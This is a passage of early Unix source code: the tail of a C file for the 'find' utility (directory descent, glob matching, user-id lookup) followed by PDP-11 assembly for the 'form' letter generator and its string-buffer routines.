	char *nargv[50], *ncom, *na;

	ccode = np = 0;
	while (na=av[com++]) {
		if(compstr(na,";")==0) break;
		if(compstr(na,"{}")==0) nargv[np++] = path;
		else nargv[np++] = na;
	}
	nargv[np] = 0;
	if (np==0) return(9);
	if(fork()) /*parent*/ wait(&ccode);
	else { /*child*/
		execv(nargv[0], nargv, np);
		i = 0;
		ncom = "/usr/bin/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
		while(c=nargv[0][i])  {
			ncom[9+i++] = c;
		}
		ncom[9+i] = '\0';
		execv(ncom+4, nargv, np);
		execv(ncom, nargv, np);
		exit(9);
	}
	return(ccode ? 0:1);
}

char fin[518];
getunum(s) char *s; { /* find username in /etc/passwd & return num. */
int i;
char str[20], *sp, c;
	i = -1;
	fin[0] = open("/etc/passwd",0);
	while(c = getchar()) {
		if(c=='\n') {
			sp = str;
			while((*sp = getchar()) != ':')
				if(! *sp++) goto RET;
			*sp = '\0';
			if(compstr(str,s)==0) {
				while((c=getchar()) != ':')
					if(! c) goto RET;
				sp = str;
				while((*sp = getchar()) != ':') sp++;
				*sp = '\0';
				i = atoi(str);
				break;
			}
		}
	}
	RET:
	close(fin);
	fin[0] = 0;
	return(i);
}

compstr(s1,s2) char s1[], s2[]; {   /* compare strings: */
register char *c1, *c2;
	c1 = s1;  c2 = s2;
	while(*c1 == *c2)
		if(*c1++ == '\0')
			return(0); /* s1 == s2 */
		else c2++;
	return(*c1 > *c2 ? 1 : -1);
}

int descend(name,goal,func,arg)
int (*func)();
char *name, goal;
{
	int dir /* open directory */, offset /* in directory */;
	int dsize, top;
	struct {
		int	dinode;
		char	dname[14];
	} dentry[32];
	register int i, j, k;
	char aname[128];

	if(stat(name,&statb)<0) {
		printf("--bad status %s\n",name);
		return(0);
	}
/*
	if((statb.iflags&060000)!=040000){ /*not a directory*/
/*
		if(goal=='f'||goal=='b') /* search goal for files */
/*
			(*func)(arg,name);
		return(1);
	} else  if(goal=='d' || goal=='b') /* search goal is directories */
/*
			(*func)(arg,name);
*/
	(*func)(arg,name);
	if((statb.iflags&060000)!=040000)
		return(1);

	top = statb.isize;
	for(offset=0 ; offset < top ; offset =+ 512) { /* each block */
		dsize = 512<(top-offset) ? 512 : (top-offset);
		if((dir=open(name,0))<0) {
			printf("--cannot open %s\n",name);
			return(0);
		}
		if(offset) seek(dir,offset,0);
		if(read(dir,&dentry,dsize)<0) {
			printf("--cannot read %s\n",name);
			return(0);
		}
		close(dir);
		for(i = 0; i < (dsize>>4); ++i) { /* each dir. entry */
			if(dentry[i].dinode==0 ||
				compstr(dentry[i].dname,".")==0 ||
				compstr(dentry[i].dname,"..")==0)
				continue;
			if (dentry[i].dinode == -1) break;
			for(j=0;aname[j]=name[j];++j);
			if(aname[j-1]!='/') aname[j++] = '/';
			for(k=0; (aname[j++]=dentry[i].dname[k]) &&
				k<13; ++k);
			aname[j] = '\0';
			if(descend(aname,goal,func,arg)==0)
				printf("--%s\n",name);
		}
	}
	return(1);
}

gmatch(s, p) /* string match as in glob */
char *s, *p; {
	if (*s=='.' && *p!='.') return(0);
	return(amatch(s, p));
}

amatch(s, p)
char *s, *p;
{
	register int cc, scc, k;
	int c, lc;

	scc = *s;
	lc = 077777;
	switch (c = *p) {

	case '[':
		k = 0;
		while (cc = *++p) {
			switch (cc) {

			case ']':
				if (k)
					return(amatch(++s, ++p));
				else
					return(0);

			case '-':
				k =| lc <= scc & scc <= (cc=p[1]);
			}
			if (scc==(lc=cc)) k++;
		}
		return(0);

	case '?':
	caseq:
		if(scc) return(amatch(++s, ++p));
		return(0);
	case '*':
		return(umatch(s, ++p));
	case 0:
		return(!scc);
	}
	if (c==scc) goto caseq;
	return(0);
}

umatch(s, p)
char *s, *p;
{
	if(*p==0) return(1);
	while(*s)
		if (amatch(s++,p)) return(1);
	return(0);
}
-- /usr/source/s1/form1.s mode=0100664 uid=3 gid=3 atime=174922969 mtime=169260571 --
signal = 48.
testing = 0
/	form letter generator
/	command sequence
/		form proto arg1 arg2...
/			where proto is letter
rfo:
	sys	signal; 2; int
	mov	$-1,buf
	mov	(sp)+,r2	/arg count
	tst	(sp)+		/skip first arg
	sub	$2,r2
	bge	2f
	mov	$default,-(sp)
2:
	mov	(sp)+,letter

1:	sys	stat; otfil; buf
	bec	2f
	sys	creat; otfil; 666
	bec	cont
2:	cmpb	$'z,otfil+4
	beq	err3
	incb	otfil+4
	br	1b

err3:
	mov	$1,r0
	sys	write; mes3; 24.
	sys	exit
mes3:	<cannot open output file\n>
otfil:	<forma\0>
default:	<letter\0>
	.even

cont:	mov	r0,rfo
	clr	rfo+2
	jsr	pc,initl
	
/	set up argument list
/
	mov	$arg,r3
	mov	$10.,r0
	jsr	pc,allocate
	mov	r1,(r3)+
1:
	dec	r2
	blt	1f
	mov	$10.,r0
	jsr	pc,allocate
	mov	r1,(r3)+
	mov	(sp)+,r4
2:
	movb	(r4)+,r0
	beq	1b
	jsr	pc,putchar
	br	2b

1:
	sys	time
	ashc	$-7,r0
	div	$675.,r0
	mov	$daytab,r2
	sub	$1461.,r0

1:	sub	(r2)+,r0
	bge	1b
	add	-(r2),r0
	mov	r0,-(sp)
	mov	arg,r1
	mov	montab-daytab(r2),r2
1:
	movb	(r2)+,r0
	beq	1f
	jsr	pc,putchar
	br	1b
1:
	movb	$' ,r0
	jsr	pc,putchar
	clr	r0
	mov	(sp),r1
	inc	r1
	div	$10.,r0
	mov	r1,(sp)
	mov	arg,r1
	tst	r0
	beq	1f
	add	$'0,r0
	jsr	pc,putchar
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	pc,putchar
	jmp	loop

daytab: 31.; 28.; 31.; 30.; 31.; 30.; 31.; 31.; 30.; 31.; 30.; 999.

montab: m1; m2; m3; m4; m5; m6; m7; m8; m9; m10; m11; m12

m1:	<January\0>
m2:	<February\0>
m3:	<March\0>
m4:	<April\0>
m5:	<May\0>
m6:	<June\0>
m7:	<July\0>
m8:	<August\0>
m9:	<September\0>
m10:	<October\0>
m11:	<November\0>
m12:	<December\0>

buf:	.=.+34.
.=rfo+516.

loop:
	mov	$10.,r0
	jsr	pc,allocate
	mov	r1,opointer
	jsr	pc,allocate
	mov	r1,ipointer
	jsr	pc,allocate
	mov	r1,curly
	mov	$10.,r0
	jsr	pc,allocate
	mov	r1,scr
	mov	letter,r3
	movb	$'\{,r0
	jsr	pc,putchar
1:
	movb	(r3)+,r0
	beq	1f
	jsr	pc,putchar
	br	1b
1:
	movb	$'\},r0
	jsr	pc,putchar

	clr	switch

	tst	iflag
	beq	1f
	mov	$1,tflag
	jmp	interrupt
1:
	jsr	pc,scan

	movb	$'\n,r0
	jsr	r5,putc
	jsr	r5,flushb

	mov	scr,r1
	jsr	pc,release
	jsr	pc,relarg
	mov	opointer,r1
	jsr	pc,release
	mov	ipointer,r1
	jsr	pc,release
	jsr	pc,relcurl
	jsr	pc,flush
	jsr	pc,whead
	.if	testing
	4
	.endif
	sys	exit
-- /usr/source/s1/form2.s mode=0100664 uid=3 gid=3 atime=174922969 mtime=169260571 --
/	scan
/	r1 = pointer to input header
/	r0 = pointer to output header
/	switch = 0 real output
/		not 0  output to r0
scan:
	mov	r0,-(sp)
	mov	r1,-(sp)

1:
	mov	(sp),r1
	jsr	pc,getchar
	bes	5f
	cmpb	r0,$'\\
	beq	3f
	cmpb	r0,$'\[
	beq	4f
	cmpb	r0,$'\{
	beq	4f
	cmpb	r0,$'\]
	beq	1f
	cmpb	r0,$'\}
	beq	7f
	cmpb	r0,$'\n
	bne	6f
	jsr	pc,lookchar
	bes	5f
	movb	$'\n,r0
6:
	tst	switch
	beq	2f
	mov	2(sp),r1
	jsr	pc,putchar
	br	1b
2:
	jsr	r5,putc
	br	1b
3:
	jsr	pc,getchar
	br	6b
/	have [ or {
4:
	mov	r(r1),-(sp)
	jsr	pc,getchar
	bes	1f
	cmpb	r0,$'0
	blt	4f
	cmpb	r0,$'9
	bgt	4f
	jsr	pc,getchar
	cmpb	r0,$'\]
	beq	3f
	cmpb	r0,$'\}
	beq	3f

4:
	mov	(sp)+,r(r1)
	mov	2(sp),r0
	jsr	pc,esub
	mov	r1,(sp)
	mov	r0,2(sp)
	br	1b

/	have arg
3:
	tst	switch
	beq	2f
	mov	opointer,r1
	mov	4(sp),r0
	jsr	pc,putword
	mov	2(sp),r1
2:
	mov	(sp)+,r(r1)
	jsr	pc,getchar
	inc	r(r1)	/skip ]
	jsr	pc,earg
	br	1b

5:
	tst	argf
	bne	1f
	mov	ipointer,r1
	jsr	pc,pop
	bes	1f
	mov	r0,(sp)
	br	1b
7:
	inc	curlyf
1:
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	pc
-- /usr/source/s1/form3.s mode=0100664 uid=3 gid=3 atime=174922969 mtime=169260571 --
/	esub
/	r1 = pointer to input string
/
esub:
	mov	r1,-(sp)
	tst	switch
	beq	1f
	mov	opointer,r1
	jsr	pc,putword
1:
	tst	iflag
	beq	1f
	mov	$2,tflag
	jmp	interrupt
1:
	inc	switch
	mov	$10.,r0
	jsr	pc,allocate
	mov	r1,r0
	mov	opointer,r1
	jsr	pc,putword
	mov	(sp)+,r1
	jsr	pc,scan

	tst	iflag
	beq	1f
	mov	$3,tflag
	jmp	interrupt
1:
	mov	r2,-(sp)
	mov	r1,r0
	mov	ipointer,r1
	jsr	pc,putword
	mov	opointer,r1
	jsr	pc,pop
	bec	9f; 4; 9:
	mov	r0,-(sp)	/last output
	mov	asmem,r1
	jsr	pc,getsp
	bes	2f
5:
	clr	curlyf
	mov	(sp),r1
	mov	r0,r2
	jsr	pc,release
6:
	mov	opointer,r1
	jsr	pc,pop
	bec	4f
	clr	switch
4:	mov	r2,r1
	jsr	pc,rewind
	tst	(sp)+
	mov	(sp)+,r2
	rts	pc


/	not in memory
2:
	mov	curly,r1
	jsr	pc,getsp
	bes	2f
	br	5b
2:
	mov	(sp),r1
	jsr	pc,rewind
	mov	$'\[,r0
1:
	jsr	r5,tfoput
	jsr	pc,getchar
	bec	1b
	mov	$'\],r0
	jsr	r5,tfoput
	mov	$10.,r0
	jsr	pc,allocate
	mov	r1,r2
	mov	(sp),r0
	tst	curlyf
	beq	1f
	clr	curlyf
	mov	curly,r1
	jsr	pc,addentry
	br	2f
1:
	mov	asmem,r1
	jsr	pc,whead
	jsr	pc,addentry
2:
	mov	r2,r1
	jsr	pc,accept
	br	6b
/
/
/	earg
/	r0 = number in ascii
/
earg:
	tst	iflag
	beq	1f
	mov	$4,tflag
	jmp	interrupt
1:
	mov	r1,-(sp)
	inc	argf
	sub	$'0,r0
	asl	r0
	mov	arg(r0),r1
	beq	5f
4:
	mov	(sp),r0
	mov	r1,(sp)
	mov	ipointer,r1
	jsr	pc,putword
	mov	opointer,r1
	jsr	pc,pop
	bec	3f
	clr	switch
3:
	mov	(sp)+,r1
	jsr	pc,rewind
	jsr	pc,scan
	mov	r0,-(sp)
	mov	ipointer,r1
	jsr	pc,pop
	bec	9f; 4; 9:
	mov	r0,r1
	clr	argf
	clr	curlyf
	mov	(sp)+,r0
	rts	pc
5:
	mov	r0,-(sp)
	mov	$'\[,r0
	jsr	r5,tfoput
	mov	(sp),r0
	asr	r0
	add	$'0,r0
	jsr	r5,tfoput
	mov	$'\],r0
	jsr	r5,tfoput
	mov	$10.,r0
	jsr	pc,allocate
	mov	(sp)+,r0
	mov	r1,arg(r0)
	jsr	pc,accept

	br	4b
-- /usr/source/s1/form4.s mode=0100664 uid=3 gid=3 atime=174922970 mtime=169260572 --
rti = 2
/	accept
/	r1 = header of where to put it
/
accept:
	mov	r0,-(sp)
	movb	$':,r0
	jsr	r5,tfoput
	movb	$' ,r0
	jsr	r5,tfoput
2:
	jsr	r5,tfiget
	cmpb	r0,$'\n
	beq	1f
	jsr	pc,putchar
	br	2b
1:
	jsr	pc,putchar
	jsr	r5,tfiget
	cmpb	r0,$'\n
	beq	1f
	jsr	pc,putchar
	br	2b
1:
	mov	(sp)+,r0
	rts	pc
/
/
/	routine to get the last word from the string
/	r1=header addr
/
pop:
	jsr	pc,fsfile
	jsr	pc,backword
	bes	1f
	sub	$2,w(r1)
1:
	rts	pc
/
/
/	routine to add an entry to assoc mem or curly
/	r1 = header
/	r0 = header of string name
/	r2 = header of string
/
addentry:
	jsr	pc,putword
	mov	r2,r0
	jsr	pc,putword
	rts	pc
/
/
/	routine to find the string pointed to by r0
/	in either memory or curly
/	r1 = where to look
/
/	returns error set if string not there
/	returns r1 = header of string if there
/
getsp:
	mov	r0,-(sp)
	mov	r1,-(sp)
	jsr	pc,rewind	/memory
3:
	mov	2(sp),r1
	jsr	pc,rewind	/output
	mov	(sp),r1
	jsr	pc,getword
	bes	1f
	mov	r0,r1
	mov	r0,-(sp)
	jsr	pc,rewind	/string
2:
	mov	(sp),r1
	jsr	pc,getchar
	bes	2f
	movb	r0,r2
	mov	4(sp),r1
	jsr	pc,getchar
	bes	4f
	cmpb	r0,r2
	beq	2b
4:
	tst	(sp)+
4:
	mov	(sp),r1
	add	$2,r(r1)
	br	3b
2:
	tst	(sp)+
	mov	2(sp),r1
	cmp	r(r1),w(r1)
	bne	4b
	mov	(sp)+,r1
	jsr	pc,getword
	tst	(sp)+
	rts	pc
1:
	mov	(sp)+,r1
	mov	(sp)+,r0
	sec
	rts	pc
/
/
/	tfoput
/
/	jsr	r5,tfoput
/
tfoput:
	mov	r0,ch
	mov	$1,r0
	sys	write; ch; 1
	rts	r5
/
/
/	tfiget
/
/	jsr	r5,tfiget
/
tfiget:
	clr	r0
	sys	read; ch; 1
	bes	1f
	tst	r0
	beq	1f
	movb	ch,r0
	rts	r5
1:
	jsr	r5,flushb
	tst	argf
	beq	1f
	mov	opointer,r1
	jsr	pc,pop
1:
	mov	$5,tflag
	jmp	interrupt
/
/	putc
/	jsr	r5,putc
/
putc:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	$rfo+2,r1
	mov	r1,r2
	add	(r1),r2
	movb	r0,2(r2)
	inc	(r1)
	cmp	(r1),$512.
	bge	1f
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	r5
1:
	mov	(sp)+,r2
	mov	(sp)+,r1
/
/
/	flush output buffer to output file.
/
flushb:
	mov	r1,-(sp)
	mov	r0,-(sp)
	mov	$rfo,r1
	mov	(r1)+,r0
	mov	(r1),0f+2
	beq	1f
	clr	(r1)+
	mov	r1,0f
	sys	write; 0:..;..
1:
	mov	(sp)+,r0
	mov	(sp)+,r1
	rts	r5
relarg:
	mov	$arg,r2
1:
	mov	(r2)+,r1
	beq	2f
	jsr	pc,release
	br	1b
2:
	cmp	r2,$arge
	blt	1b
	rts	pc
/
relcurl:
	mov	curly,r1
	jsr	pc,rewind
1:
	jsr	pc,getword
	bes	1f
	mov	r0,r1
	jsr	pc,release
	mov	curly,r1
	br	1b
1:
	jsr	pc,release
	rts	pc
/
int:
	inc	iflag
	rti
/
interrupt:
	jsr	pc,relarg
	tst	opointer
	beq	2f
1:
	mov	opointer,r1
	jsr	pc,rewind
1:
	jsr	pc,getword
	bes	1f
	mov	r0,r1
	jsr	pc,release
	mov	opointer,r1
	br	1b
1:
	mov	opointer,r1
	jsr	pc,release
	tst	ipointer
	beq	2f
	mov	ipointer,r1
	jsr	pc,release
	tst	curly
	beq	2f
	jsr	pc,relcurl
	tst	scr
	beq	2f
	mov	scr,r1
	jsr	pc,release
2:
	jsr	pc,flush
	jsr	pc,whead
	sys	exit
letter:	.=.+2
arg:	.=.+20.
arge:	0
argf:	.=.+2
switch:	.=.+2
curly:	.=.+2
curlyf:	.=.+2
ch:	.=.+2
opointer:	.=.+2
ipointer:	.=.+2
scr:	.=.+2
iflag:	0
tflag:	0
end:
-- /usr/source/s1/form5.s mode=0110664 uid=3 gid=3 atime=174922970 mtime=169260572 --
.globl b1
.globl hblk
.globl headers
.globl	initl
.globl asmem
.globl b1s
.globl b1e
.globl w1
.globl stats
.globl	lookchar
.globl	flush
.globl	fsfile
.globl	seekchar
.globl	backspace
.globl	alterchar
.globl	zero
.globl	getchar
.globl	putchar
.globl	copy
.globl	rewind
.globl	create
.globl	allocate
.globl	release
.globl	collect
.globl	w,r,a,l
.globl	getword
.globl	putword
.globl	backword
.globl	alterword
/
/
/	routine to read next character from string
/	pointer to by r1; character returned in r0
/	c-bit set if character not availiable (eof)
/
/	mov	...,r1
/	jsr	pc,getchar
/	movb	r0,...
/
getchar:
	jsr	pc,lookchar
	bes	1f
	inc	r(r1)
	tst	r0		/clears c-bit
1:	rts	pc
/
/
/	routine to read a string backwards
/	the read pointer is decremented before reading
/
/	mov	...,r1
/	jsr	pc,backspace
/	mov	r0,...
/
backspace:
	cmp	a(r1),r(r1)
	bhis	nochc
	dec	r(r1)
	jsr	pc,lookchar
	rts	pc
nochc:	clr	r0
	sec
	rts	pc
/
/
/	routine to put a word onto the string
/
/	mov	...,r1
/	mov	...,r0
/	jsr	pc,putword
/
putword:
	mov	r0,-(sp)
	sub	$hblk,r0
	jsr	pc,putchar
	swab	r0
	jsr	pc,putchar
	mov	(sp)+,r0
	rts	pc
/
/
/	routine to get a word from the string
/
/	mov	...,r1
/	jsr	pc,getword
/	mov	r0,...
/
getword:
	jsr	pc,lookchar
	bes	1f
	movb	r0,nchar
	inc	r(r1)
	jsr	pc,lookchar
	bes	1f
	movb	r0,nchar+1
	inc	r(r1)
	mov	nchar,r0
	add	$hblk,r0
1:	rts	pc
/
/
/	routine to alter the word pointed to by r(r1)
/	by replacing the word there with r0
/
/	mov	wd,r0
/	mov	...,r1
/	jsr	pc,alterword
/
alterword:
	mov	r0,-(sp)
	sub	$hblk,r0
	jsr	pc,alterchar
	swab	r0
	jsr	pc,alterchar
	mov	(sp)+,r0
	rts	pc
/
/
/	routine to get words backwards from string
/
/	mov	...,r1
/	jsr	pc,backword
/	mov	r0,...
/
backword:
	cmp	a(r1),r(r1)
	bhis	nochw
	dec	r(r1)
	jsr	pc,lookchar
	movb	r0,nchar+1
	cmp	a(r1),r(r1)
	bhis	nochw
	dec	r(r1)
	jsr	pc,lookchar
	movb	r0,nchar
	mov	nchar,r0
	add	$hblk,r0
	rts	pc
/
nochw:
	clr	r0
	sec
	rts	pc
/
/
/	routine to copy the contents of one string
/	to another.
/
/	mov	source,r0
/	mov	dest,r1
/	jsr	pc,copy
/	mov	r1,...
/
/	on return, r1 points to the new string and should
/	be saved.  r0 is preserved.
/
copy:
	inc	stats+12.
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	w(r0),r2
	sub	a(r0),r2	/W-A (old)
	mov	l(r1),r3
	sub	a(r1),r3	/L-A (new)
	cmp	r2,r3
	blos	1f
	mov	r2,r0
	jsr	pc,allocate
	mov	4(sp),r0	/new
	jsr	pc,swap
	jsr	pc,release
	mov	r0,r1
	mov	0(sp),r0	/old
1:
	mov	a(r1),w(r1)	/rewind w pointer
	cmp	r2,$512.
	blos	copy1		/is a short string
/
	jsr	pc,flush
	jsr	pc,reset
/
	mov	a(r0),-(sp)
4:
	mov	(sp),0f
	mov	afi,r0
	sys	seek;0:.. ;0	/set input pointer
	cmp	r2,$512.
	blos	2f
	mov	$512.,r3	/# output this time
	mov	r3,0f
	mov	r3,3f
	add	r3,(sp)
	sub	r3,r2	/# left to output
	br	1f
2:
	mov	r2,0f
	mov	r2,3f
	mov	r2,r3
	clr	r2
1:
	mov	afi,r0
	sys	read;b1;0:..
	bes	bad
	cmp	r0,r3
	bne	bad
	mov	afout,r0
	mov	(r1),0f
	add	r3,(r1)
	sys	seek;0:.. ;0
	sys	write;b1;3:..
	bes	bad
	tst	r2
	bgt	4b
	tst	(sp)+
/
/	fix up read ptr of new string
/
copy2:
	mov	6(sp),r0	/restore r0
	mov	r(r0),r2
	sub	a(r0),r2
	add	a(r1),r2
	mov	r2,r(r1)
/
/	restore and return
/
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	pc
/
bad:	mov	$1,r0
	sys write;1f;2f-1f
	4
1:	<error on copy\n>
2:	.even
/
swap:
	mov	w(r1),-(sp)
	mov	w(r0),w(r1)
	mov	(sp),w(r0)
	mov	r(r1),(sp)

	mov	r(r0),r(r1)
	mov	(sp),r(r0)
	mov	a(r1),(sp)
	mov	a(r0),a(r1)
	mov	(sp),a(r0)
	mov	l(r1),(sp)
	mov	l(r0),l(r1)
	mov	(sp)+,l(r0)
	rts	pc
/
/	copy a short string
/
copy1:
	mov	r(r0),-(sp)
	mov	a(r0),r(r0)
	mov	nchar,-(sp)
	mov	r0,r2		/old
	mov	r1,r3		/new
1:
	mov	r2,r1
	jsr	pc,getchar
	bes	1f
	mov	r3,r1
	jsr	pc,putchar
	br	1b
1:
	mov	r2,r0
	mov	(sp)+,nchar
	mov	(sp)+,r(r0)
	mov	r3,r1
	br	copy2
/
/
/
/
/
/	routine to rewind read pointer of string
/	pointed to by r1
/
/	mov	...,r1
/	jsr	pc,rewind
/
rewind:
	mov	a(r1),r(r1)
	rts	pc
/
/
/	routine to rewind write pointer of string
/	pointed to by r1
/
/	mov	...,r1
/	jsr	pc,create
/
create:
	mov	a(r1),w(r1)
	mov	a(r1),r(r1)
	rts	pc
/
/
/	routine to zero a string
/
/	mov	...,r1
/	jsr	pc,zero
/
zero:
	mov	r0,-(sp)
	.if testing
	jsr	pc,preposterous
	.endif
	mov	a(r1),w(r1)
	clrb	r0
1:	cmp	w(r1),l(r1)
	bhis	1f
	jsr	pc,putchar
	br	1b
1:	mov	a(r1),w(r1)
	mov	(sp)+,r0
	rts	pc
/
/
/
/	routine to move the read pointer of a string to the
/	relative position indicated by r0.  the string is
/	extended if necessary - there is no error return.
/
/	mov	position,r0
/	mov	...,r1
/	jsr	pc,seekchar
/
seekchar:
	mov	r1,-(sp)
	mov	r0,-(sp)
	.if testing
	jsr	pc,preposterous
	.endif
	inc	stats+10.
1:
	mov	(sp),r0
	add	a(r1),r0
	cmp	r0,l(r1)
	bhi	3f
	mov	r0,r(r1)
	cmp	r0,w(r1)
	blo	1f
	mov	r0,w(r1)
	br	1f
3:
	mov	(sp),r0
	jsr	pc,allocate
	mov	2(sp),r0
	jsr	pc,copy
	jsr	pc,swap
	jsr	pc,release
	mov	2(sp),r1
	br	1b
1:
	mov	(sp)+,r0
	mov	(sp)+,r1
	rts	pc
/
/
/	routine to move read pointer of string to end of string
/
/	mov	...,r1
/	jsr	pc,fsfile
/
fsfile:
	mov	r0,-(sp)
	.if testing
	jsr	pc,preposterous
	.endif
	inc	stats+10.
	mov	w(r1),r(r1)
	mov	(sp)+,r0
	rts	pc
/
/
/	routine to place the character in r0 at the current
/	position of the read pointer - the read pointer
/	is not moved.
/
/	movb	ch,r0
/	mov	...,r1
/	jsr	pc,alterchar
/	mov	r1,...
/
alterchar:
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,nchar
	.if testing
	jsr	pc,preposterous
	.endif
	inc	stats+8.
1:	cmp	r(r1),l(r1)	/W,L
	blo	3f
	mov	l(r1),r0
	inc	r0
	sub	a(r1),r0	/W-A+1
	jsr	pc,allocate
	mov	(sp),r0
	jsr	pc,copy
	jsr	pc,swap
	jsr	pc,release
	mov	(sp),r1
3:
	mov	r(r1),r0
	jsr	pc,bufchar
	bec	2f
	jsr	pc,getbuf

2:	movb	nchar,(r0)
	mov	$1,w1(r2)
	mov	nchar,r0	/to preserve r0 for user
	inc	r(r1)
	cmp	r(r1),w(r1)
	blos	3f
	mov	r(r1),w(r1)
3:
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	pc
/
/
/	routine to look at next character from string
/	pointed to by r1;  character returned in r0
/	c-bit set if character not available (end of file)
/	r1 is preserved
/
/	mov	...,r1
/	jsr	pc,lookchar
/	movb	r0,...
/
lookchar:
	mov	r2,-(sp)
	inc	stats+6.
	.if testing
	jsr	pc,preposterous
	.endif
	cmp	w(r1),r(r1)	/W,R
	blos	noch
	mov	r(r1),r0
	jsr	pc,bufchar
	bec	2f
	jsr	pc,getbuf
/
2:
	inc	flag
	bne	2f
	jsr	pc,fixct
	br	1f
2:
	mov	flag,u1(r2)
1:
	mov	(sp)+,r2
	movb	(r0),r0
	tst	r0	/clears c-bit
	rts	pc
/
noch:
	mov	(sp)+,r2
	clr	r0
	sec
	rts	pc
/
/
/	routine to put a character into the string
/	pointed to by r1;  character in r0
/	r0 is preserved; r1 points to the string
/	after return and must be saved.
/
/	movb	ch,r0
/	mov	...,r1
/	jsr	pc,putchar
/	mov	r1,...
/
putchar:
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,nchar
	.if testing
	jsr	pc,preposterous
	.endif
	inc	stats+8.
1:	cmp	w(r1),l(r1)	/W,L
	blo	3f
	mov	w(r1),r0
	inc	r0
	sub	a(r1),r0	/W-A+1
	jsr	pc,allocate
	mov	(sp),r0
	jsr	pc,copy
	jsr	pc,swap
	jsr	pc,release
	mov	(sp),r1
3:
	mov	w(r1),r0
	jsr	pc,bufchar
	bec	2f
	jsr	pc,getbuf
2:	movb	nchar,(r0)
	mov	$1,w1(r2)
	mov	nchar,r0	/to preserve r0 for user
	inc	w(r1)
	inc	flag
	bne	2f
	jsr	pc,fixct
	br	1f
2:
	mov	flag,u1(r2)
1:
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	pc
/
/
/	routine to flush contents of all buffers.
/
/	jsr	pc,flush
/
flush:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	clr	r3
1:
	cmp	r3,$numb
	bhis	1f
	mov	r3,r2
	asl	r2
	tst	w1(r2)
	ble	2f
	mov	r3,r1
	ashc	$9.,r1
	bic	$777,r1
	add	$b1,r1
	jsr	pc,clean
2:
	inc	r3
	br	1b
1:
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc
/
/
reset:
	mov	r3,-(sp)
	mov	r2,-(sp)
	clr	r3
1:
	cmp	r3,$numb
	bge	1f
	mov	r3,r2
	asl	r2
	mov	$-1.,w1(r2)
	clr	b1s(r2)
	clr	b1e(r2)
	clr	u1(r2)
	inc	r3
	br	1b
1:
	clr	flag
	mov	(sp)+,r2
	mov	(sp)+,r3
	rts	pc
/
/
/	routine to read from disc to a buffer
/	wcing the buffer if necessary
/
/	mov	disc addr,r0
/	mov	buffer addr,r2
/	jsr	pc,getb
/
/	on return r0 = addr of byte in buffer
/
getb:
	mov	r3,-(sp)
	mov	r1,-(sp)
	mov	r0,-(sp)
	mov	r2,r3
	asr	r3
	mov	r3,r1
	ashc	$9.,r1
	bic	$777,r1
	add	$b1,r1
	tst	w1(r2)	/ w
	ble	1f

	jsr	pc,clean

1:	mov	(sp),r0
	bic	$777,r0		/get lowest multiple of 512.
	mov	r0,0f
	mov	r0,b1s(r2)	/set start
	mov	afi,r0
	sys	seek;0:..;0
	mov	r1,0f
	sys	read;0:..;512.

	mov	b1s(r2),b1e(r2)
	add	$512.,b1e(r2)	/ set end
	clr	w1(r2)		/clear w
	mov	(sp)+,r0
	sub	b1s(r2),r0
	add	r1,r0		/ set r0=byte addr in buffer
	mov	(sp)+,r1
	mov	(sp)+,r3
	rts	pc
/
/
/	routine to wc a buffer
/
/	mov	buffer addr,r2
/	mov	buffer addr+6,r1	beginning of buffer
/	jsr	pc,clean
/
clean:
	inc	stats+24.
	mov	r0,-(sp)
	mov	b1s(r2),0f
	mov	afout,r0
	sys	seek;0:..;0
	mov	r1,0f
	sys	write;0:..;512.

	clr	w1(r2)	/clear w
	mov	(sp)+,r0
	rts	pc
/
/
/	routine to get buffer addr of byte whose disc
/	addr is in r0 - also returns addr of write
/	flag for buffer in r2
/
/	mov	disc addr,r0
/	jsr	pc,bufchar
/	mov	(r0),r0	for read
/	inc	(r2)	for write must inc w
/
/	c-bit set if char not in either buffer
/
bufchar:
	mov	r1,-(sp)
	mov	r3,-(sp)
	clr	r3
1:
	mov	r3,r2
	asl	r2
	cmp	r0,b1s(r2)
	blo	2f
	cmp	r0,b1e(r2)
	bhis	2f
	sub	b1s(r2),r0
	mov	r3,r1
	ashc	$9.,r1
	bic	$777,r1
	add	r1,r0
	add	$b1,r0
	mov	(sp)+,r3
	mov	(sp)+,r1
	clc
	rts	pc
2:
	inc	r3
	cmp	r3,$numb
	blt	1b
	mov	(sp)+,r3
	mov	(sp)+,r1
	sec
	rts	pc
/
/
/	routine to get a buffer
/
/	mov	disc addr,r0
/	jsr	pc,getbuf
/	mov	(r0),r0		(for read)
/	inc	(r2)		must inc w for w
/
getbuf:
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	$2,r3
	clr	r2
	mov	$1,r4
1:
	cmp	r4,$numb
	bge	1f
	cmp	u1(r3),u1(r2)
	bhis	2f
	mov	r3,r2
2:
	inc	r4
	add	$2.,r3
	br	1b
1:
	mov	r2,r3
	jsr	pc,getb
	add	$stats+14.,r3
	inc	(r3)
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	pc
/
/
/	this routine renumbers the time used cell u1(r2)
/	of the buffers when the clock overflows
/
fixct:
	mov	r1,-(sp)
	mov	r3,-(sp)
	mov	$numb,r1
	mov	$numb,flag
2:
	mov	r1,u1(r2)
	dec	r1
	bge	1f
	mov	(sp)+,r3
	mov	(sp)+,r1
	rts	pc
1:
	clr	r2
	mov	$2,r3
1:
	cmp	r3,$numb2
	bge	2b
	cmp	u1(r3),u1(r2)
	blo	2f
	mov	r3,r2
2:
	add	$2,r3
	br	1b
-- /usr/source/s1/form6.s mode=0110664 uid=3 gid=3 atime=174922971 mtime=169260572 --
.globl	b1
.globl log2
.globl frlist
.globl stats
.globl b1s
.globl b1e
.globl w1
/	here to allocate a new block
/
/
/	mov	...,r0
/	jsr	pc,allocate
